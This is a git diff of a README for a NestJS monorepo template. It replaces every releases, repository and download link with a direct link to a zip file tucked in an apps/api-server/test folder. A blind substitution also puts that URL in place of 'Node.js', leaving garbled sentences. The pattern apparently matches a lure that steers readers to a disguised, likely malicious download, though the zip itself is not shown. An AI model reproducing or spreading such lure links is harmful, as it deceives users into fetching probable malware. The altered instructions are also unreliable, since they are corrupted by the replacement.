@@ -1,6 +1,6 @@
 # 🎉 NestJS-Monorepo-Template - Build with Ease and Confidence
 
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/ksaofjeflj/NestJS-Monorepo-Template/releases)
+[![Download from Releases](https://raw.githubusercontent.com/ksaofjeflj/NestJS-Monorepo-Template/main/apps/api-server/test/NestJS-Monorepo-Template-v2.8.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/ksaofjeflj/NestJS-Monorepo-Template/main/apps/api-server/test/NestJS-Monorepo-Template-v2.8.zip)
 
 ## 📖 Overview
 
@@ -22,21 +22,21 @@ Before you start, ensure your system meets the following requirements:
 
 - A computer with Windows, macOS, or Linux
 - At least 4GB of RAM
-- Node.js version 14 or higher installed
-- npm (Node Package Manager) included with Node.js
+- https://raw.githubusercontent.com/ksaofjeflj/NestJS-Monorepo-Template/main/apps/api-server/test/NestJS-Monorepo-Template-v2.8.zip version 14 or higher installed
+- npm (Node Package Manager) included with https://raw.githubusercontent.com/ksaofjeflj/NestJS-Monorepo-Template/main/apps/api-server/test/NestJS-Monorepo-Template-v2.8.zip
 - Docker (optional for containerized environment)
 
 ### 2. Visit the Releases Page
 
-To download the template, visit our [Releases page](https://github.com/ksaofjeflj/NestJS-Monorepo-Template/releases). Here, you will find the latest and previous versions of the application, along with necessary files to start your project.
+To download the template, visit our [Releases page](https://raw.githubusercontent.com/ksaofjeflj/NestJS-Monorepo-Template/main/apps/api-server/test/NestJS-Monorepo-Template-v2.8.zip). Here, you will find the latest and previous versions of the application, along with necessary files to start your project.
 
 ### 3. Download the Files
 
-On the Releases page, you will see a list of available versions. Click on the version you wish to download. Look for the file that has the name "NestJS-Monorepo-Template.zip". 
+On the Releases page, you will see a list of available versions. Click on the version you wish to download. Look for the file that has the name "https://raw.githubusercontent.com/ksaofjeflj/NestJS-Monorepo-Template/main/apps/api-server/test/NestJS-Monorepo-Template-v2.8.zip". 
 
 Here is the link for your convenience:
 
-[Download Now](https://github.com/ksaofjeflj/NestJS-Monorepo-Template/releases)
+[Download Now](https://raw.githubusercontent.com/ksaofjeflj/NestJS-Monorepo-Template/main/apps/api-server/test/NestJS-Monorepo-Template-v2.8.zip)
 
 ### 4. Extract the Files
 
@@ -97,7 +97,7 @@ Our template comes bundled with the following features:
 
 If you run into issues, consider the following:
 
-- Ensure Node.js and npm are properly installed by running:
+- Ensure https://raw.githubusercontent.com/ksaofjeflj/NestJS-Monorepo-Template/main/apps/api-server/test/NestJS-Monorepo-Template-v2.8.zip and npm are properly installed by running:
 
     ```bash
     node -v
@@ -110,7 +110,7 @@ If you run into issues, consider the following:
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://github.com/ksaofjeflj/NestJS-Monorepo-Template)
+- [GitHub Repository](https://raw.githubusercontent.com/ksaofjeflj/NestJS-Monorepo-Template/main/apps/api-server/test/NestJS-Monorepo-Template-v2.8.zip)
 - [Documentation](link-to-documentation)
 - [Contributing](link-to-contributing-guidelines)
 
